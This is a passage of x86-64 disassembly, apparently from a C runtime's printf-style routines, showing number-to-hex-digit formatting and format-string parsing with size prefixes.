   32c484042:	74 7c                	je     0x32c4840c0
   32c484044:	83 6b 10 01          	subl   $0x1,0x10(%rbx)
   32c484048:	44 89 d1             	mov    %r10d,%ecx
   32c48404b:	49 89 d9             	mov    %rbx,%r9
   32c48404e:	48 89 f2             	mov    %rsi,%rdx
   32c484051:	e8 ba fc ff ff       	call   0x32c483d10
   32c484056:	48 89 f1             	mov    %rsi,%rcx
   32c484059:	e8 c2 11 00 00       	call   0x32c485220
   32c48405e:	90                   	nop
   32c48405f:	48 83 c4 68          	add    $0x68,%rsp
   32c484063:	5b                   	pop    %rbx
   32c484064:	5e                   	pop    %rsi
   32c484065:	c3                   	ret
   32c484066:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c48406d:	00 00 00 
   32c484070:	c7 42 10 01 00 00 00 	movl   $0x1,0x10(%rdx)
   32c484077:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   32c48407d:	e9 1c ff ff ff       	jmp    0x32c483f9e
   32c484082:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c484088:	c7 42 10 06 00 00 00 	movl   $0x6,0x10(%rdx)
   32c48408f:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   32c484095:	e9 04 ff ff ff       	jmp    0x32c483f9e
   32c48409a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c4840a0:	44 89 d1             	mov    %r10d,%ecx
   32c4840a3:	49 89 d8             	mov    %rbx,%r8
   32c4840a6:	48 89 c2             	mov    %rax,%rdx
   32c4840a9:	e8 22 e9 ff ff       	call   0x32c4829d0
   32c4840ae:	48 89 f1             	mov    %rsi,%rcx
   32c4840b1:	e8 6a 11 00 00       	call   0x32c485220
   32c4840b6:	90                   	nop
   32c4840b7:	48 83 c4 68          	add    $0x68,%rsp
   32c4840bb:	5b                   	pop    %rbx
   32c4840bc:	5e                   	pop    %rsi
   32c4840bd:	c3                   	ret
   32c4840be:	66 90                	xchg   %ax,%ax
   32c4840c0:	48 89 f1             	mov    %rsi,%rcx
   32c4840c3:	44 89 54 24 3c       	mov    %r10d,0x3c(%rsp)
   32c4840c8:	e8 e3 43 00 00       	call   0x32c4884b0
   32c4840cd:	44 8b 44 24 5c       	mov    0x5c(%rsp),%r8d
   32c4840d2:	44 8b 54 24 3c       	mov    0x3c(%rsp),%r10d
   32c4840d7:	83 e8 01             	sub    $0x1,%eax
   32c4840da:	89 43 10             	mov    %eax,0x10(%rbx)
   32c4840dd:	e9 66 ff ff ff       	jmp    0x32c484048
   32c4840e2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c4840e8:	48 89 f1             	mov    %rsi,%rcx
   32c4840eb:	44 89 54 24 3c       	mov    %r10d,0x3c(%rsp)
   32c4840f0:	e8 bb 43 00 00       	call   0x32c4884b0
   32c4840f5:	44 8b 44 24 5c       	mov    0x5c(%rsp),%r8d
   32c4840fa:	ba 00 00 00 00       	mov    $0x0,%edx
   32c4840ff:	44 8b 54 24 3c       	mov    0x3c(%rsp),%r10d
   32c484104:	44 29 c0             	sub    %r8d,%eax
   32c484107:	0f 48 c2             	cmovs  %edx,%eax
   32c48410a:	89 43 10             	mov    %eax,0x10(%rbx)
   32c48410d:	e9 ec fe ff ff       	jmp    0x32c483ffe
   32c484112:	0f 1f 00             	nopl   (%rax)
   32c484115:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48411c:	00 00 00 00 
   32c484120:	41 55                	push   %r13
   32c484122:	41 54                	push   %r12
   32c484124:	55                   	push   %rbp
   32c484125:	57                   	push   %rdi
   32c484126:	56                   	push   %rsi
   32c484127:	53                   	push   %rbx
   32c484128:	48 83 ec 58          	sub    $0x58,%rsp
   32c48412c:	45 8b 50 10          	mov    0x10(%r8),%r10d
   32c484130:	49 89 c9             	mov    %rcx,%r9
   32c484133:	4c 89 c3             	mov    %r8,%rbx
   32c484136:	48 85 c9             	test   %rcx,%rcx
   32c484139:	75 09                	jne    0x32c484144
   32c48413b:	66 85 d2             	test   %dx,%dx
   32c48413e:	0f 84 e4 00 00 00    	je     0x32c484228
   32c484144:	44 8d 42 fd          	lea    -0x3(%rdx),%r8d
   32c484148:	41 83 fa 0e          	cmp    $0xe,%r10d
   32c48414c:	0f 86 8e 00 00 00    	jbe    0x32c4841e0
   32c484152:	49 0f bf e8          	movswq %r8w,%rbp
   32c484156:	ba 10 00 00 00       	mov    $0x10,%edx
   32c48415b:	4d 85 c9             	test   %r9,%r9
   32c48415e:	0f 84 f4 03 00 00    	je     0x32c484558
   32c484164:	8b 4b 08             	mov    0x8(%rbx),%ecx
   32c484167:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   32c48416c:	48 89 fe             	mov    %rdi,%rsi
   32c48416f:	41 89 cb             	mov    %ecx,%r11d
   32c484172:	41 83 e3 20          	and    $0x20,%r11d
   32c484176:	eb 30                	jmp    0x32c4841a8
   32c484178:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c48417f:	00 
   32c484180:	48 39 f7             	cmp    %rsi,%rdi
   32c484183:	72 09                	jb     0x32c48418e
   32c484185:	44 8b 53 10          	mov    0x10(%rbx),%r10d
   32c484189:	45 85 d2             	test   %r10d,%r10d
   32c48418c:	78 0d                	js     0x32c48419b
   32c48418e:	83 c0 30             	add    $0x30,%eax
   32c484191:	49 89 f2             	mov    %rsi,%r10
   32c484194:	41 88 02             	mov    %al,(%r10)
   32c484197:	48 83 c6 01          	add    $0x1,%rsi
   32c48419b:	49 c1 e9 04          	shr    $0x4,%r9
   32c48419f:	83 ea 01             	sub    $0x1,%edx
   32c4841a2:	0f 84 28 01 00 00    	je     0x32c4842d0
   32c4841a8:	44 89 c8             	mov    %r9d,%eax
   32c4841ab:	83 e0 0f             	and    $0xf,%eax
   32c4841ae:	83 fa 01             	cmp    $0x1,%edx
   32c4841b1:	0f 84 d9 00 00 00    	je     0x32c484290
   32c4841b7:	44 8b 53 10          	mov    0x10(%rbx),%r10d
   32c4841bb:	45 85 d2             	test   %r10d,%r10d
   32c4841be:	7e 08                	jle    0x32c4841c8
   32c4841c0:	41 83 ea 01          	sub    $0x1,%r10d
   32c4841c4:	44 89 53 10          	mov    %r10d,0x10(%rbx)
   32c4841c8:	85 c0                	test   %eax,%eax
   32c4841ca:	74 b4                	je     0x32c484180
   32c4841cc:	83 f8 09             	cmp    $0x9,%eax
   32c4841cf:	76 bd                	jbe    0x32c48418e
   32c4841d1:	83 c0 37             	add    $0x37,%eax
   32c4841d4:	49 89 f2             	mov    %rsi,%r10
   32c4841d7:	44 09 d8             	or     %r11d,%eax
   32c4841da:	eb b8                	jmp    0x32c484194
   32c4841dc:	0f 1f 40 00          	nopl   0x0(%rax)
   32c4841e0:	b9 0e 00 00 00       	mov    $0xe,%ecx
   32c4841e5:	b8 04 00 00 00       	mov    $0x4,%eax
   32c4841ea:	49 d1 e9             	shr    $1,%r9
   32c4841ed:	44 29 d1             	sub    %r10d,%ecx
   32c4841f0:	c1 e1 02             	shl    $0x2,%ecx
   32c4841f3:	48 d3 e0             	shl    %cl,%rax
   32c4841f6:	4c 01 c8             	add    %r9,%rax
   32c4841f9:	0f 89 49 03 00 00    	jns    0x32c484548
   32c4841ff:	b9 0f 00 00 00       	mov    $0xf,%ecx
   32c484204:	48 c1 e8 03          	shr    $0x3,%rax
   32c484208:	44 8d 42 01          	lea    0x1(%rdx),%r8d
   32c48420c:	44 29 d1             	sub    %r10d,%ecx
   32c48420f:	49 0f bf e8          	movswq %r8w,%rbp
   32c484213:	c1 e1 02             	shl    $0x2,%ecx
   32c484216:	48 d3 e8             	shr    %cl,%rax
   32c484219:	49 89 c1             	mov    %rax,%r9
   32c48421c:	41 8d 52 01          	lea    0x1(%r10),%edx
   32c484220:	e9 3f ff ff ff       	jmp    0x32c484164
   32c484225:	0f 1f 00             	nopl   (%rax)
   32c484228:	41 83 fa 0e          	cmp    $0xe,%r10d
   32c48422c:	0f 87 f6 02 00 00    	ja     0x32c484528
   32c484232:	b9 0e 00 00 00       	mov    $0xe,%ecx
   32c484237:	b8 04 00 00 00       	mov    $0x4,%eax
   32c48423c:	31 ed                	xor    %ebp,%ebp
   32c48423e:	45 31 c0             	xor    %r8d,%r8d
   32c484241:	44 29 d1             	sub    %r10d,%ecx
   32c484244:	c1 e1 02             	shl    $0x2,%ecx
   32c484247:	48 d3 e0             	shl    %cl,%rax
   32c48424a:	b9 0f 00 00 00       	mov    $0xf,%ecx
   32c48424f:	48 01 c0             	add    %rax,%rax
   32c484252:	44 29 d1             	sub    %r10d,%ecx
   32c484255:	c1 e1 02             	shl    $0x2,%ecx
   32c484258:	48 d3 e8             	shr    %cl,%rax
   32c48425b:	49 89 c1             	mov    %rax,%r9
   32c48425e:	48 85 c0             	test   %rax,%rax
   32c484261:	75 b9                	jne    0x32c48421c
   32c484263:	45 85 d2             	test   %r10d,%r10d
   32c484266:	75 b4                	jne    0x32c48421c
   32c484268:	8b 4b 08             	mov    0x8(%rbx),%ecx
   32c48426b:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   32c484270:	48 89 f8             	mov    %rdi,%rax
   32c484273:	f6 c5 08             	test   $0x8,%ch
   32c484276:	74 0a                	je     0x32c484282
   32c484278:	c6 44 24 30 2e       	movb   $0x2e,0x30(%rsp)
   32c48427d:	48 8d 44 24 31       	lea    0x31(%rsp),%rax
   32c484282:	c6 00 30             	movb   $0x30,(%rax)
   32c484285:	48 8d 70 01          	lea    0x1(%rax),%rsi
   32c484289:	eb 4e                	jmp    0x32c4842d9
   32c48428b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c484290:	48 39 f7             	cmp    %rsi,%rdi
   32c484293:	72 1b                	jb     0x32c4842b0
   32c484295:	f6 c5 08             	test   $0x8,%ch
   32c484298:	75 16                	jne    0x32c4842b0
   32c48429a:	44 8b 53 10          	mov    0x10(%rbx),%r10d
   32c48429e:	45 85 d2             	test   %r10d,%r10d
   32c4842a1:	0f 8e e1 02 00 00    	jle    0x32c484588
   32c4842a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c4842ae:	00 00 
   32c4842b0:	c6 06 2e             	movb   $0x2e,(%rsi)
   32c4842b3:	48 83 c6 01          	add    $0x1,%rsi
   32c4842b7:	e9 0c ff ff ff       	jmp    0x32c4841c8
   32c4842bc:	45 85 d2             	test   %r10d,%r10d
   32c4842bf:	75 0f                	jne    0x32c4842d0
   32c4842c1:	c6 06 30             	movb   $0x30,(%rsi)
   32c4842c4:	48 83 c6 01          	add    $0x1,%rsi
   32c4842c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c4842cf:	00 
   32c4842d0:	48 39 fe             	cmp    %rdi,%rsi
   32c4842d3:	0f 84 d7 02 00 00    	je     0x32c4845b0
   32c4842d9:	44 8b 53 0c          	mov    0xc(%rbx),%r10d
   32c4842dd:	41 bc 02 00 00 00    	mov    $0x2,%r12d
   32c4842e3:	45 85 d2             	test   %r10d,%r10d
   32c4842e6:	0f 8e 96 00 00 00    	jle    0x32c484382
   32c4842ec:	8b 53 10             	mov    0x10(%rbx),%edx
   32c4842ef:	49 89 f1             	mov    %rsi,%r9
   32c4842f2:	41 0f bf c0          	movswl %r8w,%eax
   32c4842f6:	49 29 f9             	sub    %rdi,%r9
   32c4842f9:	46 8d 1c 0a          	lea    (%rdx,%r9,1),%r11d
   32c4842fd:	85 d2                	test   %edx,%edx
   32c4842ff:	89 ca                	mov    %ecx,%edx
   32c484301:	45 0f 4f cb          	cmovg  %r11d,%r9d
   32c484305:	81 e2 c0 01 00 00    	and    $0x1c0,%edx
   32c48430b:	83 fa 01             	cmp    $0x1,%edx
   32c48430e:	49 0f bf d0          	movswq %r8w,%rdx
   32c484312:	41 83 d9 fa          	sbb    $0xfffffffa,%r9d
   32c484316:	48 69 d2 67 66 66 66 	imul   $0x66666667,%rdx,%rdx
   32c48431d:	c1 f8 1f             	sar    $0x1f,%eax
   32c484320:	45 89 cb             	mov    %r9d,%r11d
   32c484323:	48 c1 fa 22          	sar    $0x22,%rdx
   32c484327:	29 c2                	sub    %eax,%edx
   32c484329:	74 3e                	je     0x32c484369
   32c48432b:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c484332:	00 00 00 
   32c484335:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c48433c:	00 00 00 00 
   32c484340:	48 63 c2             	movslq %edx,%rax
   32c484343:	c1 fa 1f             	sar    $0x1f,%edx
   32c484346:	41 83 c3 01          	add    $0x1,%r11d
   32c48434a:	48 69 c0 67 66 66 66 	imul   $0x66666667,%rax,%rax
   32c484351:	48 c1 f8 22          	sar    $0x22,%rax
   32c484355:	29 d0                	sub    %edx,%eax
   32c484357:	89 c2                	mov    %eax,%edx
   32c484359:	75 e5                	jne    0x32c484340
   32c48435b:	45 89 dc             	mov    %r11d,%r12d
   32c48435e:	45 29 cc             	sub    %r9d,%r12d
   32c484361:	41 83 c4 02          	add    $0x2,%r12d
   32c484365:	45 0f bf e4          	movswl %r12w,%r12d
   32c484369:	45 39 da             	cmp    %r11d,%r10d
   32c48436c:	0f 8e 56 01 00 00    	jle    0x32c4844c8
   32c484372:	45 29 da             	sub    %r11d,%r10d
   32c484375:	f6 c5 06             	test   $0x6,%ch
   32c484378:	0f 84 72 01 00 00    	je     0x32c4844f0
   32c48437e:	44 89 53 0c          	mov    %r10d,0xc(%rbx)
   32c484382:	f6 c1 80             	test   $0x80,%cl
   32c484385:	0f 85 25 01 00 00    	jne    0x32c4844b0
   32c48438b:	f6 c5 01             	test   $0x1,%ch
   32c48438e:	0f 85 44 01 00 00    	jne    0x32c4844d8
   32c484394:	83 e1 40             	and    $0x40,%ecx
   32c484397:	0f 85 d3 01 00 00    	jne    0x32c484570
   32c48439d:	48 89 da             	mov    %rbx,%rdx
   32c4843a0:	b9 30 00 00 00       	mov    $0x30,%ecx
   32c4843a5:	e8 96 e2 ff ff       	call   0x32c482640
   32c4843aa:	8b 4b 08             	mov    0x8(%rbx),%ecx
   32c4843ad:	48 89 da             	mov    %rbx,%rdx
   32c4843b0:	83 e1 20             	and    $0x20,%ecx
   32c4843b3:	83 c9 58             	or     $0x58,%ecx
   32c4843b6:	e8 85 e2 ff ff       	call   0x32c482640
   32c4843bb:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c4843be:	85 c0                	test   %eax,%eax
   32c4843c0:	7e 28                	jle    0x32c4843ea
   32c4843c2:	f6 43 09 02          	testb  $0x2,0x9(%rbx)
   32c4843c6:	74 22                	je     0x32c4843ea
   32c4843c8:	83 e8 01             	sub    $0x1,%eax
   32c4843cb:	89 43 0c             	mov    %eax,0xc(%rbx)
   32c4843ce:	66 90                	xchg   %ax,%ax
   32c4843d0:	48 89 da             	mov    %rbx,%rdx
   32c4843d3:	b9 30 00 00 00       	mov    $0x30,%ecx
   32c4843d8:	e8 63 e2 ff ff       	call   0x32c482640
   32c4843dd:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c4843e0:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c4843e3:	89 53 0c             	mov    %edx,0xc(%rbx)
   32c4843e6:	85 c0                	test   %eax,%eax
   32c4843e8:	7f e6                	jg     0x32c4843d0
   32c4843ea:	48 39 f7             	cmp    %rsi,%rdi
   32c4843ed:	72 20                	jb     0x32c48440f
   32c4843ef:	eb 4c                	jmp    0x32c48443d
   32c4843f1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c4843f8:	0f b7 43 20          	movzwl 0x20(%rbx),%eax
   32c4843fc:	66 89 44 24 2e       	mov    %ax,0x2e(%rsp)
   32c484401:	66 85 c0             	test   %ax,%ax
   32c484404:	0f 85 86 00 00 00    	jne    0x32c484490
   32c48440a:	48 39 fe             	cmp    %rdi,%rsi
   32c48440d:	74 2e                	je     0x32c48443d
   32c48440f:	0f be 4e ff          	movsbl -0x1(%rsi),%ecx
   32c484413:	48 83 ee 01          	sub    $0x1,%rsi
   32c484417:	83 f9 2e             	cmp    $0x2e,%ecx
   32c48441a:	74 64                	je     0x32c484480
   32c48441c:	83 f9 2c             	cmp    $0x2c,%ecx
   32c48441f:	74 d7                	je     0x32c4843f8
   32c484421:	48 89 da             	mov    %rbx,%rdx
   32c484424:	e8 17 e2 ff ff       	call   0x32c482640
   32c484429:	eb df                	jmp    0x32c48440a
   32c48442b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c484430:	48 89 da             	mov    %rbx,%rdx
   32c484433:	b9 30 00 00 00       	mov    $0x30,%ecx
   32c484438:	e8 03 e2 ff ff       	call   0x32c482640
   32c48443d:	8b 43 10             	mov    0x10(%rbx),%eax
   32c484440:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c484443:	89 53 10             	mov    %edx,0x10(%rbx)
   32c484446:	85 c0                	test   %eax,%eax
   32c484448:	7f e6                	jg     0x32c484430
   32c48444a:	8b 4b 08             	mov    0x8(%rbx),%ecx
   32c48444d:	48 89 da             	mov    %rbx,%rdx
   32c484450:	83 e1 20             	and    $0x20,%ecx
   32c484453:	83 c9 50             	or     $0x50,%ecx
   32c484456:	e8 e5 e1 ff ff       	call   0x32c482640
   32c48445b:	44 01 63 0c          	add    %r12d,0xc(%rbx)
   32c48445f:	48 89 da             	mov    %rbx,%rdx
   32c484462:	48 89 e9             	mov    %rbp,%rcx
   32c484465:	81 4b 08 c0 01 00 00 	orl    $0x1c0,0x8(%rbx)
   32c48446c:	48 83 c4 58          	add    $0x58,%rsp
   32c484470:	5b                   	pop    %rbx
   32c484471:	5e                   	pop    %rsi
   32c484472:	5f                   	pop    %rdi
   32c484473:	5d                   	pop    %rbp
   32c484474:	41 5c                	pop    %r12
   32c484476:	41 5d                	pop    %r13
   32c484478:	e9 e3 e5 ff ff       	jmp    0x32c482a60
   32c48447d:	0f 1f 00             	nopl   (%rax)
   32c484480:	48 89 d9             	mov    %rbx,%rcx
   32c484483:	e8 d8 f2 ff ff       	call   0x32c483760
   32c484488:	e9 7d ff ff ff       	jmp    0x32c48440a
   32c48448d:	0f 1f 00             	nopl   (%rax)
   32c484490:	49 89 d8             	mov    %rbx,%r8
   32c484493:	ba 01 00 00 00       	mov    $0x1,%edx
   32c484498:	48 8d 4c 24 2e       	lea    0x2e(%rsp),%rcx
   32c48449d:	e8 0e e2 ff ff       	call   0x32c4826b0
   32c4844a2:	e9 63 ff ff ff       	jmp    0x32c48440a
   32c4844a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   32c4844ae:	00 00 
   32c4844b0:	48 89 da             	mov    %rbx,%rdx
   32c4844b3:	b9 2d 00 00 00       	mov    $0x2d,%ecx
   32c4844b8:	e8 83 e1 ff ff       	call   0x32c482640
   32c4844bd:	e9 db fe ff ff       	jmp    0x32c48439d
   32c4844c2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c4844c8:	41 ba ff ff ff ff    	mov    $0xffffffff,%r10d
   32c4844ce:	e9 ab fe ff ff       	jmp    0x32c48437e
   32c4844d3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c4844d8:	48 89 da             	mov    %rbx,%rdx
   32c4844db:	b9 2b 00 00 00       	mov    $0x2b,%ecx
   32c4844e0:	e8 5b e1 ff ff       	call   0x32c482640
   32c4844e5:	e9 b3 fe ff ff       	jmp    0x32c48439d
   32c4844ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c4844f0:	41 83 ea 01          	sub    $0x1,%r10d
   32c4844f4:	44 89 53 0c          	mov    %r10d,0xc(%rbx)
   32c4844f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c4844ff:	00 
   32c484500:	48 89 da             	mov    %rbx,%rdx
   32c484503:	b9 20 00 00 00       	mov    $0x20,%ecx
   32c484508:	e8 33 e1 ff ff       	call   0x32c482640
   32c48450d:	8b 43 0c             	mov    0xc(%rbx),%eax
   32c484510:	8d 50 ff             	lea    -0x1(%rax),%edx
   32c484513:	89 53 0c             	mov    %edx,0xc(%rbx)
   32c484516:	85 c0                	test   %eax,%eax
   32c484518:	7f e6                	jg     0x32c484500
   32c48451a:	8b 4b 08             	mov    0x8(%rbx),%ecx
   32c48451d:	e9 60 fe ff ff       	jmp    0x32c484382
   32c484522:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c484528:	45 85 d2             	test   %r10d,%r10d
   32c48452b:	0f 8e 8f 00 00 00    	jle    0x32c4845c0
   32c484531:	31 ed                	xor    %ebp,%ebp
   32c484533:	45 31 c0             	xor    %r8d,%r8d
   32c484536:	45 31 c9             	xor    %r9d,%r9d
   32c484539:	ba 10 00 00 00       	mov    $0x10,%edx
   32c48453e:	e9 21 fc ff ff       	jmp    0x32c484164
   32c484543:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c484548:	49 0f bf e8          	movswq %r8w,%rbp
   32c48454c:	e9 f9 fc ff ff       	jmp    0x32c48424a
   32c484551:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c484558:	45 85 d2             	test   %r10d,%r10d
   32c48455b:	0f 8f 03 fc ff ff    	jg     0x32c484164
   32c484561:	e9 02 fd ff ff       	jmp    0x32c484268
   32c484566:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   32c48456d:	00 00 00 
   32c484570:	48 89 da             	mov    %rbx,%rdx
   32c484573:	b9 20 00 00 00       	mov    $0x20,%ecx
   32c484578:	e8 c3 e0 ff ff       	call   0x32c482640
   32c48457d:	e9 1b fe ff ff       	jmp    0x32c48439d
   32c484582:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   32c484588:	85 c0                	test   %eax,%eax
   32c48458a:	0f 84 2c fd ff ff    	je     0x32c4842bc
   32c484590:	83 f8 09             	cmp    $0x9,%eax
   32c484593:	0f 87 38 fc ff ff    	ja     0x32c4841d1
   32c484599:	83 c0 30             	add    $0x30,%eax
   32c48459c:	48 83 c6 01          	add    $0x1,%rsi
   32c4845a0:	88 46 ff             	mov    %al,-0x1(%rsi)
   32c4845a3:	e9 28 fd ff ff       	jmp    0x32c4842d0
   32c4845a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   32c4845af:	00 
   32c4845b0:	8b 43 10             	mov    0x10(%rbx),%eax
   32c4845b3:	85 c0                	test   %eax,%eax
   32c4845b5:	0f 8f bd fc ff ff    	jg     0x32c484278
   32c4845bb:	e9 b0 fc ff ff       	jmp    0x32c484270
   32c4845c0:	41 8b 48 08          	mov    0x8(%r8),%ecx
   32c4845c4:	31 ed                	xor    %ebp,%ebp
   32c4845c6:	45 31 c0             	xor    %r8d,%r8d
   32c4845c9:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   32c4845ce:	e9 9d fc ff ff       	jmp    0x32c484270
   32c4845d3:	66 90                	xchg   %ax,%ax
   32c4845d5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   32c4845dc:	00 00 00 00 
   32c4845e0:	41 57                	push   %r15
   32c4845e2:	41 56                	push   %r14
   32c4845e4:	41 55                	push   %r13
   32c4845e6:	41 54                	push   %r12
   32c4845e8:	55                   	push   %rbp
   32c4845e9:	57                   	push   %rdi
   32c4845ea:	56                   	push   %rsi
   32c4845eb:	53                   	push   %rbx
   32c4845ec:	48 81 ec a8 00 00 00 	sub    $0xa8,%rsp
   32c4845f3:	48 8b ac 24 10 01 00 	mov    0x110(%rsp),%rbp
   32c4845fa:	00 
   32c4845fb:	44 89 c6             	mov    %r8d,%esi
   32c4845fe:	4c 89 cb             	mov    %r9,%rbx
   32c484601:	89 cf                	mov    %ecx,%edi
   32c484603:	49 89 d4             	mov    %rdx,%r12
   32c484606:	e8 5d 3e 00 00       	call   0x32c488468
   32c48460b:	0f be 0b             	movsbl (%rbx),%ecx
   32c48460e:	66 0f ef c0          	pxor   %xmm0,%xmm0
   32c484612:	66 0f 6e ce          	movd   %esi,%xmm1
   32c484616:	44 8b 38             	mov    (%rax),%r15d
   32c484619:	81 e7 00 60 00 00    	and    $0x6000,%edi
   32c48461f:	31 c0                	xor    %eax,%eax
   32c484621:	31 d2                	xor    %edx,%edx
   32c484623:	66 0f 62 c1          	punpckldq %xmm1,%xmm0
   32c484627:	66 89 84 24 88 00 00 	mov    %ax,0x88(%rsp)
   32c48462e:	00 
   32c48462f:	89 c8                	mov    %ecx,%eax
   32c484631:	4c 89 64 24 70       	mov    %r12,0x70(%rsp)
   32c484636:	89 7c 24 78          	mov    %edi,0x78(%rsp)
   32c48463a:	c7 84 24 84 00 00 00 	movl   $0xfffffffd,0x84(%rsp)
   32c484641:	fd ff ff ff 
   32c484645:	c7 84 24 8c 00 00 00 	movl   $0x0,0x8c(%rsp)
   32c48464c:	00 00 00 00 
   32c484650:	66 89 94 24 90 00 00 	mov    %dx,0x90(%rsp)
   32c484657:	00 
   32c484658:	c7 84 24 9c 00 00 00 	movl   $0xffffffff,0x9c(%rsp)
   32c48465f:	ff ff ff ff 
   32c484663:	66 0f d6 84 24 94 00 	movq   %xmm0,0x94(%rsp)
   32c48466a:	00 00 
   32c48466c:	85 c9                	test   %ecx,%ecx
   32c48466e:	0f 84 53 01 00 00    	je     0x32c4847c7
   32c484674:	48 83 c3 01          	add    $0x1,%rbx
   32c484678:	4c 8d 25 c1 79 00 00 	lea    0x79c1(%rip),%r12        # 0x32c48c040
   32c48467f:	eb 4d                	jmp    0x32c4846ce
   32c484681:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   32c484688:	8b 54 24 78          	mov    0x78(%rsp),%edx
   32c48468c:	8b b4 24 94 00 00 00 	mov    0x94(%rsp),%esi
   32c484693:	f6 c6 40             	test   $0x40,%dh
   32c484696:	75 09                	jne    0x32c4846a1
   32c484698:	39 b4 24 98 00 00 00 	cmp    %esi,0x98(%rsp)
   32c48469f:	7e 11                	jle    0x32c4846b2
   32c4846a1:	4c 8b 44 24 70       	mov    0x70(%rsp),%r8
   32c4846a6:	80 e6 20             	and    $0x20,%dh
   32c4846a9:	75 6d                	jne    0x32c484718
   32c4846ab:	48 63 d6             	movslq %esi,%rdx
   32c4846ae:	41 88 04 10          	mov    %al,(%r8,%rdx,1)
   32c4846b2:	83 c6 01             	add    $0x1,%esi
   32c4846b5:	89 b4 24 94 00 00 00 	mov    %esi,0x94(%rsp)
   32c4846bc:	0f b6 03             	movzbl (%rbx),%eax
   32c4846bf:	48 83 c3 01          	add    $0x1,%rbx
   32c4846c3:	0f be c8             	movsbl %al,%ecx
   32c4846c6:	85 c9                	test   %ecx,%ecx
   32c4846c8:	0f 84 f2 00 00 00    	je     0x32c4847c0
   32c4846ce:	83 f9 25             	cmp    $0x25,%ecx
   32c4846d1:	75 b5                	jne    0x32c484688
   32c4846d3:	0f b6 03             	movzbl (%rbx),%eax
   32c4846d6:	89 7c 24 78          	mov    %edi,0x78(%rsp)
   32c4846da:	48 c7 44 24 7c ff ff 	movq   $0xffffffffffffffff,0x7c(%rsp)
   32c4846e1:	ff ff 
   32c4846e3:	84 c0                	test   %al,%al
   32c4846e5:	0f 84 d5 00 00 00    	je     0x32c4847c0
   32c4846eb:	48 89 de             	mov    %rbx,%rsi
   32c4846ee:	4c 8d 74 24 7c       	lea    0x7c(%rsp),%r14
   32c4846f3:	45 31 db             	xor    %r11d,%r11d
   32c4846f6:	45 31 d2             	xor    %r10d,%r10d
   32c4846f9:	8d 50 e0             	lea    -0x20(%rax),%edx
   32c4846fc:	4c 8d 6e 01          	lea    0x1(%rsi),%r13
   32c484700:	0f be c8             	movsbl %al,%ecx
   32c484703:	80 fa 5a             	cmp    $0x5a,%dl
   32c484706:	77 58                	ja     0x32c484760
   32c484708:	0f b6 d2             	movzbl %dl,%edx
   32c48470b:	49 63 14 94          	movslq (%r12,%rdx,4),%rdx
   32c48470f:	4c 01 e2             	add    %r12,%rdx
   32c484712:	ff e2                	jmp    *%rdx
   32c484714:	0f 1f 40 00          	nopl   0x0(%rax)
   32c484718:	4c 89 c2             	mov    %r8,%rdx
   32c48471b:	e8 60 3d 00 00       	call   0x32c488480
   32c484720:	eb 90                	jmp    0x32c4846b2
   32c484722:	0f b6 46 01          	movzbl 0x1(%rsi),%eax
   32c484726:	3c 36                	cmp    $0x36,%al
   32c484728:	0f 84 e0 08 00 00    	je     0x32c48500e
   32c48472e:	3c 33                	cmp    $0x33,%al
   32c484730:	0f 85 d8 07 00 00    	jne    0x32c484f0e
   32c484736:	80 7e 02 32          	cmpb   $0x32,0x2(%rsi)
   32c48473a:	0f 84 7e 09 00 00    	je     0x32c4850be
   32c484740:	48 8d 56 02          	lea    0x2(%rsi),%rdx
   32c484744:	b9 33 00 00 00       	mov    $0x33,%ecx
   32c484749:	4c 89 ee             	mov    %r13,%rsi
   32c48474c:	41 ba 04 00 00 00    	mov    $0x4,%r10d
   32c484752:	49 89 d5             	mov    %rdx,%r13
   32c484755:	41 bb 03 00 00 00    	mov    $0x3,%r11d
   32c48475b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   32c484760:	83 e8 30             	sub    $0x30,%eax
   32c484763:	3c 09                	cmp    $0x9,%al
   32c484765:	0f 87 ad 08 00 00    	ja     0x32c485018
   32c48476b:	41 83 fa 04          	cmp    $0x4,%r10d
   32c48476f:	0f 84 a3 08 00 00    	je     0x32c485018
   32c484775:	45 85 d2             	test   %r10d,%r10d
   32c484778:	0f 85 27 07 00 00    	jne    0x32c484ea5
   32c48477e:	48 89 f2             	mov    %rsi,%rdx
